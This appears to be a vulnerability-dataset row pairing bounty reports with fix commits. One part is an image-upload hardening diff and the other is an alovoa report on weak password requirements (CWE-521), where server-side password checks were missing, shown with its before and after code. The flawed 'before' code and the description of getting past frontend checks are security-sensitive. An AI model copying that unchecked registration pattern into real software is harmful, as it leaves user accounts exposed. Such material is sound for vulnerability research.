@@ -270,6 +292,9 @@ else if (e.getName().equals(""onCaptureImage""))
    byte[] imageData = Base64.decodeBase64(dataUrl.substring(contentStartIndex).getBytes());
    AImage img = new AImage(defaultNameForCaptureImage, imageData);
    image.setContent(img);
    image.setClientAttribute(""sandbox"", """");
    image.setVisible(true);
    image.invalidate();

    if (m_mImage == null)
     m_mImage = new MImage (Env.getCtx(), 0, null);
@@ -328,14 +353,25 @@ private void processUploadMedia(Media imageFile) {
   return;

  String fileName = imageFile.getName();

  String mimeType = MimeType.getMimeType(fileName);
  if (! autoPreviewList.contains(mimeType))
   throw new AdempiereException(Msg.getMsg(Env.getCtx(), ""UploadImageTypeNotAllowed""));

  //  See if we can load & display it
  try
  {
   InputStream is = imageFile.getStreamData();
   AImage aImage = new AImage(fileName, is);

   image.setContent(aImage);

   if (autoPreviewList.contains(mimeType)) {
    image.setContent(aImage);
    image.setClientAttribute(""sandbox"", """");
    image.setVisible(true);
    image.invalidate();
   } else {
    image.setSrc(null);
    image.setVisible(false);
   }

   is.close();
  }"
https://huntr.dev/bounties/1-Alovoa/alovoa/,Weak Password Requirements in alovoa/alovoa,"It is possible to set a weak password with no compliance with the register form checks that state ""Your password needs to be at least 7 characters long and must contain characters and numbers."" If a user bypasses the frontend checks, he will be able to register a completely weak password because the method register() at RegisterService.java:138 saves the password as it comes from the request, without prior checks about length and character composition. It is also possible to note that email format is validated in the same file, previous saving of the object.",,CWE-521: Weak Password Requirements,https://www.github.com/alovoa/alovoa/commit/76661ad253e371c876fe157200fc196c3f9667f3,"@@ -89,6 +89,8 @@ public class RegisterService {
 private UserService userService;

 private static final String GMAIL_EMAIL = ""@gmail"";



 private static final Logger logger = LoggerFactory.getLogger(RegisterService.class);

@@ -204,6 +206,7 @@ public User registerConfirm(String tokenString) throws MessagingException, IOExc
  return user;
 }


 private BaseRegisterDto registerBase(RegisterDto dto) throws AlovoaException {

  if (dto.getFirstName().length() > firstNameLengthMax || dto.getFirstName().length() < firstNameLengthMin) {
@@ -215,10 +218,20 @@ private BaseRegisterDto registerBase(RegisterDto dto) throws AlovoaException {
  if (userAge < minAge) {
   throw new AlovoaException(publicService.text(""backend.error.register.min-age""));
  }









  User user = new User();
  user.setEmail(dto.getEmail().toLowerCase());
  user.setFirstName(dto.getFirstName());


  int userMinAge = userAge - ageRange;
  int userMaxAge = userAge + ageRange;
  if (userMinAge < minAge) {

","13
src/main/java/com/nonononoki/alovoa/service/RegisterService.java
@@ -89,6 +89,8 @@ public class RegisterService {
 private UserService userService;

 private static final String GMAIL_EMAIL = ""@gmail"";

 private static final int MIN_PASSWORD_SIZE = 7;

 private static final Logger logger = LoggerFactory.getLogger(RegisterService.class);

@@ -204,6 +206,7 @@ public User registerConfirm(String tokenString) throws MessagingException, IOExc
  return user;
 }

 //used by normal registration and oauth
 private BaseRegisterDto registerBase(RegisterDto dto) throws AlovoaException {

  if (dto.getFirstName().length() > firstNameLengthMax || dto.getFirstName().length() < firstNameLengthMin) {
@@ -215,10 +218,20 @@ private BaseRegisterDto registerBase(RegisterDto dto) throws AlovoaException {
  if (userAge < minAge) {
   throw new AlovoaException(publicService.text(""backend.error.register.min-age""));
  }

  if(dto.getPassword().length() < MIN_PASSWORD_SIZE) {
   throw new AlovoaException(""password_too_short"");
  }

  if(!dto.getPassword().matches("".*\\d.*"") || !dto.getPassword().matches("".*[a-zA-Z].*"")) {
   throw new AlovoaException(""password_too_simple"");
  }

  User user = new User();
  user.setEmail(dto.getEmail().toLowerCase());
  user.setFirstName(dto.getFirstName());

  //default age bracket, user can change it later in their profile
  int userMinAge = userAge - ageRange;
  int userMaxAge = userAge + ageRange;
  if (userMinAge < minAge) {"
